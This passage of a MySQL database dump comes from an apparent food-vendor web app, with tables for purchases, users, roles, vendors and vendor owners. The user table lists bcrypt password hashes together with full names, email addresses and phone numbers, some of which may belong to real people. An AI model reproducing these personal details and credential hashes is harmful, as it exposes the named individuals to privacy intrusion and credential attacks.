-- Table structure for table `purchase_detail`
--

CREATE TABLE `purchase_detail` (
  `pdid` int(11) NOT NULL,
  `purchaseid` int(11) NOT NULL,
  `productid` int(11) NOT NULL,
  `quantity` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_vietnamese_ci;

--
-- Dumping data for table `purchase_detail`
--

INSERT INTO `purchase_detail` (`pdid`, `purchaseid`, `productid`, `quantity`) VALUES
(13, 8, 15, 2),
(14, 8, 17, 2),
(15, 8, 18, 2),
(16, 9, 15, 3);

-- --------------------------------------------------------

--
-- Table structure for table `user`
--

CREATE TABLE `user` (
  `id` int(11) NOT NULL,
  `username` varchar(50) COLLATE utf8_vietnamese_ci NOT NULL,
  `fullname` varchar(50) COLLATE utf8_vietnamese_ci NOT NULL,
  `password` varchar(100) COLLATE utf8_vietnamese_ci NOT NULL,
  `email` varchar(100) COLLATE utf8_vietnamese_ci NOT NULL,
  `sdt` varchar(20) COLLATE utf8_vietnamese_ci NOT NULL,
  `role` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_vietnamese_ci;

--
-- Dumping data for table `user`
--

INSERT INTO `user` (`id`, `username`, `fullname`, `password`, `email`, `sdt`, `role`) VALUES
(9, 'admin', 'Admin', '$2y$10$CWK209WNP7Jv6QogS4JTZuh9afycGiHogHd8LnJq0P0nhYs4V77iW', 'admin1@gmail.com', '1234123', 0),
(18, 'khang', 'Võ Vĩ Khang', '$2y$10$tlfFkV.ZNBznUxkANogCkOzJXdspLI2rJOfL.4jpjM.BBhF8k97AG', 'khang.vo2000@hcmut.edu.vn', '0967830088', 2),
(19, 'hoangkhoa', 'Hoang Khoa', '$2y$10$gP9BySL3ryfyYyA0osJtUuVfkNWQ0bmRgP7GfSX1AxEa5pRLPu016', 'hoangkhoa@gmail.com', '0978145757', 2),
(20, 'hoangkhoacook', 'Hoang Khoa Cook', '$2y$10$rf855SDjXXRNbS5pI6iEGeFsJ8yTr5l/XQIvEo4RuWRyqbBNnZC6m', 'cook@gmail.com', '0978145757', 3),
(21, 'khanh', 'Ngô Quốc Khánh', '$2y$10$k3HQ6FMk301T9hE2ZDiUIO93hsxgVMif/w5FYDCx6hjjCYHD9bch6', 'khanh@gmail.com', '0123456789', 2),
(22, 'khoango', 'Ngô Anh Khoa', '$2y$10$46YmzS5GjNsamMObCfrWt.LkWmWrSf.ag1QcAf01e2zEllBaeVjzu', 'khoango@gmail.com', '0913092929', 2);

-- --------------------------------------------------------

--
-- Table structure for table `user_role`
--

CREATE TABLE `user_role` (
  `role` int(11) NOT NULL,
  `role_name` varchar(100) COLLATE utf8_vietnamese_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_vietnamese_ci;

--
-- Dumping data for table `user_role`
--

INSERT INTO `user_role` (`role`, `role_name`) VALUES
(0, 'It Staff'),
(1, 'Manager'),
(2, 'Vendor Owner'),
(3, 'Cook'),
(4, 'Customer');

-- --------------------------------------------------------

--
-- Table structure for table `vendor`
--

CREATE TABLE `vendor` (
  `id` int(11) NOT NULL,
  `name` varchar(100) COLLATE utf8_vietnamese_ci NOT NULL,
  `description` mediumtext COLLATE utf8_vietnamese_ci NOT NULL,
  `photo` varchar(200) COLLATE utf8_vietnamese_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_vietnamese_ci;

--
-- Dumping data for table `vendor`
--

INSERT INTO `vendor` (`id`, `name`, `description`, `photo`) VALUES
(20, 'Vietnamese Traditional Food Shop', 'We provide famous Vietnamese traditional food here!', 'assets/img/vendor/20.jpg'),
(23, 'Sweet Food Shop', 'We sell a lot of sweet food of various category ! <3', 'assets/img/vendor/23.jpg'),
(24, 'Vietnamese Street Food Shop', 'What is Street Food? The ancient occupation of “making something to eat”, finds a new future and conquers the food of our shop.', 'assets/img/vendor/24.jpg'),
(25, 'BKDrinks', 'We have various popular drinks !', 'assets/img/vendor/25.jpg');

-- --------------------------------------------------------

--
-- Table structure for table `vendor_owner`
--

CREATE TABLE `vendor_owner` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `vendor_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_vietnamese_ci;

--
-- Dumping data for table `vendor_owner`
--

INSERT INTO `vendor_owner` (`id`, `user_id`, `vendor_id`) VALUES
(2, 15, 1),
(3, 16, 1),
(4, 17, 2),
(5, 18, 20),
(6, 19, 23),
(7, 20, 23),
(8, 21, 24),
(9, 22, 25);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `category`
--
ALTER TABLE `category`
  ADD PRIMARY KEY (`categoryid`);

--
-- Indexes for table `category_product`
--
ALTER TABLE `category_product`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `message`
--
ALTER TABLE `message`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `orders`
--
ALTER TABLE `orders`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `product`
--
ALTER TABLE `product`
  ADD PRIMARY KEY (`product_id`);

--
-- Indexes for table `purchase`
--
ALTER TABLE `purchase`
  ADD PRIMARY KEY (`purchaseid`);

--
-- Indexes for table `purchase_detail`
--
ALTER TABLE `purchase_detail`
  ADD PRIMARY KEY (`pdid`);

--
-- Indexes for table `user`
--
ALTER TABLE `user`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `username` (`username`);

--
-- Indexes for table `user_role`
--
ALTER TABLE `user_role`
  ADD PRIMARY KEY (`role`);

--
-- Indexes for table `vendor`
--
ALTER TABLE `vendor`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `vendor_owner`
--
ALTER TABLE `vendor_owner`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `category`
--
ALTER TABLE `category`
  MODIFY `categoryid` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- AUTO_INCREMENT for table `category_product`
--
ALTER TABLE `category_product`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=23;

--
-- AUTO_INCREMENT for table `message`
--
ALTER TABLE `message`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=49;

--
-- AUTO_INCREMENT for table `orders`
--
ALTER TABLE `orders`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=21;

--
-- AUTO_INCREMENT for table `product`
--
ALTER TABLE `product`
  MODIFY `product_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=64;

--
-- AUTO_INCREMENT for table `purchase`
--
ALTER TABLE `purchase`
  MODIFY `purchaseid` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;

--
-- AUTO_INCREMENT for table `purchase_detail`
--
ALTER TABLE `purchase_detail`
  MODIFY `pdid` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=17;

--
-- AUTO_INCREMENT for table `user`
--
ALTER TABLE `user`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=23;

--
-- AUTO_INCREMENT for table `vendor`
--
ALTER TABLE `vendor`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=26;

--
-- AUTO_INCREMENT for table `vendor_owner`
--
ALTER TABLE `vendor_owner`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
